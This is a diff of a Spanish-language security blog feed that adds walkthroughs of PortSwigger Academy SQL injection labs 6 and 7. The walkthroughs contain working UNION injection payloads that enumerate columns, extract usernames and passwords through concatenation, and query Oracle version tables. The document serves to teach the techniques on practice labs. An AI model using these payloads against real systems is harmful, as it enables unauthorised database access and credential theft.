@@ -181,7 +181,7 @@
 &lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
 &lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
 &lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=PetsPets&#39; order by 4--
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 4--
 &lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
 &lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
@@ -251,6 +251,172 @@
 &lt;ol&gt;
 &lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 6</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/</link>
+        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 6" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column&#34;&gt;Lab: SQL injection UNION attack, retrieving multiple values in a single column&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos de una tabla, las columnas son &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;. Es igual al anterior lab solamente que esta vez se tiene que extraer los datos en una sola columna haciendo uso de una consulta sql. La forma que tiene SQL para poder extraer datos de esa manera es de la siguiente:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;DBMS&lt;/th&gt;
+&lt;th&gt;Concatenacion&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Oracle&lt;/td&gt;
+&lt;td&gt;&amp;lsquo;foo&amp;rsquo;||&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Microsoft&lt;/td&gt;
+&lt;td&gt;&amp;lsquo;foo&amp;rsquo;+&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Postgresql&lt;/td&gt;
+&lt;td&gt;&amp;lsquo;foo&amp;rsquo;||&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MySQL&lt;/td&gt;
+&lt;td&gt;&amp;lsquo;foo&amp;rsquo; &amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.&lt;/p&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;p&gt;Estos pasos se repetiran los mismos del laboratorio anterior Lab5.&lt;/p&gt;
+&lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
+&lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 1--
+https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 2--
+https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 3--
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Al ver que en 2 muestra bien y en 3 da un error interno, sabemos que cuenta con 2 columnas.&lt;/p&gt;
+&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
+&lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora sabemos que solo podemos inyectar texto en el una columna que seria la segunda.&lt;/p&gt;
+&lt;h4 id=&#34;recuperar-datos-de-usuarios&#34;&gt;Recuperar datos de usuarios&lt;/h4&gt;
+&lt;p&gt;Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos las siguientes consultas:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username from users--
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 191; 
+			flex-basis: 459px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido.png&#34; data-size=&#34;1745x912&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido.png&#34;
+			width=&#34;1745&#34;
+			height=&#34;912&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido_hu7cf6220e675afdae83dcd87cd1dc56d7_113580_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido_hu7cf6220e675afdae83dcd87cd1dc56d7_113580_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Contrasenas de la tabla users&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Contrasenas de la tabla users&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Pero haciendo dos consultas es muy complicado recuperar todos estos datos y luego unirlos y saber que valor es de cada uno. Para eso podemos usar la concatenacion que es propia del sistema, solo es de saber que sistema se esta usando en el backend realizando pruebas, probaremos con todos y ver si nos arroja un resultado. La consultaria quedaria asi:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username password from users--
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username+password from users--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora con alguno de los payloads ingresados pudimos recuperar los datos en una misma columna como se puede ver y ya contamos con el usuario y las credenciales, ya solo queda ingresar al sistema y resuelto.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 190; 
+			flex-basis: 457px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto.png&#34; data-size=&#34;1759x922&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto.png&#34;
+			width=&#34;1759&#34;
+			height=&#34;922&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto_hu9d5730c6ab29b54153ded2e5932f61ce_120693_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto_hu9d5730c6ab29b54153ded2e5932f61ce_120693_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Algo para finalizar que se podria hacer es agregar un guion para saber cuando termina una columna de la otra, esto se arregla agregando cualquier caracter en el medio, por ejemplo un &lt;code&gt;-&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username||&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||password from users--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 7</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/</link>
+        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 7" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle&#34;&gt;Lab: SQL injection attack, querying the database type and version on Oracle&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la version de Oracle especificamente algo sobre este string &lt;code&gt;Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Ya que sabemos que el gestor es Oracle, se utilizaran payloads de Oracle y la manera de extraer los datos es muy diferente, siguiendo los pasos anteriores tocara enumerar columnas&lt;/p&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1--
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- //Genera error
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
+&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude. En este caso &lt;code&gt;Oracle&lt;/code&gt; como se nota no se puede enviar un select sin el valor from, ya que es algo propio de Oracle que es una tabla especial.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from DUAL--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-version&#34;&gt;Recuperar version&lt;/h3&gt;
+&lt;p&gt;Ahora recuperar la version, las consultas utilizadas para esto en &lt;code&gt;Oracle&lt;/code&gt; son las siguientes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;banner&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$version&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$instance&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La inyeccion quedaria de la siguiente manera:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union SELECT banner,null FROM v$version--
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$instance&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 107; 
+			flex-basis: 257px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto.png&#34; data-size=&#34;1737x1618&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto.png&#34;
+			width=&#34;1737&#34;
+			height=&#34;1618&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto_hu081edbd2834f27b821984a0363499c58_455462_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto_hu081edbd2834f27b821984a0363499c58_455462_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
